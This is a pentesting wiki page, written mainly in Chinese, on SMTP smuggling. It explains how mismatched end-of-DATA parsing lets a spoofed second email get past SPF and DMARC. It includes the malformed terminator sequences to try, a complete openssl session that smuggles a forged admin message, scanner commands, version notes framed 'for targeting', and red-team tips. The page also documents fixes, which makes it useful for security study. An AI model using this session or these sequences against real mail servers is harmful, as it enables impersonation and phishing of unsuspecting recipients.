# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

This type of vulnerability was [**originally discovered in this post**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) were it's explained that It's possible to **exploit discrepancies in how the SMTP protocol is interpreted** when finalising an email, allowing an attacker to smuggle more emails in the body of the legit one, allowing to impersonate other users of the affected domain (such as admin@outlook.com) bypassing defenses such as SPF.

### 为什么

这是因为在 SMTP 协议中，邮件要发送的**消息数据**由用户（攻击者）控制，攻击者可以发送特制数据，滥用解析器之间的差异，在接收端走私额外的邮件。请看原文的示意图：

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### 如何

为了利用此漏洞，攻击者需要发送一些数据，使得 **Outbound SMPT server thinks that it's just 1 email but the Inbound SMTP server thinks that there are several emails**。

研究人员发现，不同的 **Inbound servers 将不同字符视为邮件数据的结束**，而这些字符可能不会被 Outbound 服务器视为结束。\
例如，常见的数据结束是 `\r\n.\r`。但如果 Inbound SMTP server 也接受 `\n.`，攻击者就可以在邮件中加入该序列并开始插入新的 SMTP 命令，从而走私新的邮件，就像上图所示。

当然，这只有在 **Outbound SMTP server 不把该数据视为消息数据结束** 时才会生效；否则它会看到两封邮件而不是一封。归根结底，这就是该漏洞所滥用的反同步（desynchronization）问题。

可能导致反同步的数据序列：

- `\n.`
- `\n.\r`

另请注意，SPF 会被绕过，因为如果你从 `user@outlook.com` 的邮件中走私出 `admin@outlook.com`，**发送者仍然是 `outlook.com`.**

---

## 攻击者检查清单（需要满足的条件）

要成功走私第二封邮件，通常需要：

- 一个可通过的 outbound 服务器 A（通常有有效凭证），它会原样转发非标准的 end‑of‑DATA 序列。历史上许多服务会转发诸如 `\n.\r\n` 或 `\n.\n` 的变体。
- 一个接收服务器 B，会将该非标准序列解释为 end‑of‑DATA，然后把随后的内容解析为新的 SMTP 命令（MAIL/RCPT/DATA...）。
- Outbound 必须实际使用 `DATA` 发送（不是 `BDAT`）。如果 A 支持 CHUNKING/BDAT，只有当它回退到 DATA（例如 B 不宣告 CHUNKING）时，smuggling 才能奏效；否则基于长度的 BDAT 会消除歧义。
- 不要求 PIPELINING，但它有助于将注入的命令隐藏在单次 TCP 写入中，以防中间设备重新同步。

常见且值得测试的 end‑of‑DATA 变体（取决于接收端）：

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r`（以裸 CR 结尾）

注意：实际有效的是 “A 转发的内容” ∩ “B 接受的内容” 的交集。

---

## 手动利用示例（单会话）

下面用一个原始的 STARTTLS SMTP 会话展示思路。在第一个 DATA 块之后插入一个非标准终止符，然后再插入另一个 SMTP 对话，接收服务器可能将其视为一封新邮件。

<details>
<summary>手动 smuggling 会话 (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
如果 A 转发 `\n.\r\n` 而 B 将其接受为 end‑of‑DATA，消息 “hello B” 可能会被当作来自 `admin@target.com` 的第二封邮件接受，同时通过 SPF（与 A 的 IP 对齐）。
</details>

Tip: 当交互式测试时，确保使用 `-crlf`，以便 OpenSSL 在你输入时保留 CRLF。

---

## 自动化和扫描器

- hannob/smtpsmug：发送以多个损坏的 end‑of‑DATA 序列结尾的消息，以查看接收方接受哪些。
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools：用于入站和出站两侧的扫描器，外加一个分析 SMTP 服务器，以精确查看哪些序列能从发送方存活下来。
- Inbound quick check: `python3 smtp_smuggling_scanner.py victim@target.com`
- 通过中继的出站检查：`python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

这些工具可帮助你绘制出实际能进行 smuggling 的 A→B 配对。

---

## CHUNKING/BDAT vs DATA

- DATA 使用终止符 `<CR><LF>.<CR><LF>`；任何关于 CR/LF 的规范化或 dot‑stuffing 的不确定性都会导致 desync。
- CHUNKING (BDAT) 使用精确字节长度对消息体进行分帧，因此可以防止经典的 smuggling。不过，如果发送方回退到 DATA（因为接收方未声明 CHUNKING），经典的 smuggling 会再次变得可行。

---

## Notes on affected software and fixes (for targeting)

- Postfix：在 3.9 之前默认容忍裸 LF；从 3.5.23/3.6.13/3.7.9/3.8.4 起管理员可以启用 `smtpd_forbid_bare_newline`。当前建议为 `smtpd_forbid_bare_newline = normalize`（3.8.5+/3.7.10+/3.6.14+/3.5.24+），或将其设为 `reject` 以严格执行 RFC。
- Exim：在 4.97.1（及更高版本）中修复了当使用 DATA 时依赖混合 end‑of‑DATA 序列的变体。旧的 4.97/4.96 可能会根据 PIPELINING/CHUNKING 的情况而可被利用。
- Sendmail：在 8.18 中修复；旧的 8.17.x 接受一些非标准的终止符。
- 各类库/服务器（例如 aiosmtpd 在 1.4.5 之前、一些厂商网关以及特定的 SaaS relays）存在类似问题；现代版本通常只在严格使用 `<CR><LF>.<CR><LF>` 时接受 DATA。

使用上面的扫描器验证当前行为；许多厂商在 2024 年至 2025 年初更改了默认设置。

---

## 针对 red team ops 的提示

- 对于 A，优先选择大型常见发送方（历史上常见如 Exchange Online、shared hosters 等）。如果它们仍会转发某些非标准的 EOM 且位于受害者的 SPF 中，你被 smuggled 的 MAIL FROM 将继承它们的信誉。
- 枚举 B 的 SMTP 扩展：查看 `EHLO` banner 是否有 PIPELINING/CHUNKING；如果 CHUNKING 缺失，来自 BDAT‑first 的发送方成功率更高。将其与畸形的 EOM 结合以探测接受情况。
- 观察头部：smuggled 的消息通常会在 B 处生成独立的 Received 链。DMARC 常常会通过，因为 MAIL FROM 与 A 的 IP 空间对齐。

---

## **参考资料**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
